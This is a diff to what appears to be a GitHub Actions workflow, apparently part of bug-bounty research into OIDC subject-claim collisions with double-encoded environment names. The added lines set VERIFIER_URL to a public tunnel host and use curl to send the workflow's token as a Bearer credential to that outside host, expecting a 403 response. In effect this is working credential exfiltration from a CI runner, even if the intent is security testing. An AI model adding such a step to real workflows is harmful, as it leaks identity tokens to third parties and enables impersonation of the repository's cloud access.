@@ -51,6 +51,8 @@ jobs:
     environment: 'Production%253AV1'
     steps:
       - name: Confirm the double-encoded name does not collide
+        env:
+          VERIFIER_URL: https://276b15c4335221.lhr.life/
         shell: bash
         run: |
           set -euo pipefail
@@ -62,3 +64,12 @@ jobs:
           jq -c '{environment,environment_node_id,sub,repository,run_id}' <<<"$payload"
           test "$(jq -r '.sub' <<<"$payload")" = \
             'repo:h1-no01-b-260806@313884183/h1-oidc-env-collision-0912074723@1367077963:environment:Production%253AV1'
+
+          status="$(curl --silent --show-error \
+            --output verifier-response.json \
+            --write-out '%{http_code}' \
+            -H "Authorization: Bearer $token" \
+            "$VERIFIER_URL")"
+          printf 'verifier_http_status=%s\n' "$status"
+          jq -c . verifier-response.json
+          test "$status" = '403'
